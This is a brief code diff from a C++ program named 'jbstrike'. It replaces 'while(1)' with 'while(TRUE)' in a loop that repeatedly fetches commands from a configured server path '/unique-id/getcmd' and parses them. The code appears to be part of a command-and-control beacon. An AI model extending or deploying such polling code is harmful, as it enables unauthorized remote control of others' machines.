@@ -6,7 +6,7 @@ jbstrike::Application::Application() {}
 
 void jbstrike::Application::Run() {
 
-	while(1) {
+	while(TRUE) {
 		std::string data = http.Get(cfg.UriString, "/unique-id/getcmd");
 		jbstrike::ReceivedCmd ParsedCommand = ParseData(data);
 
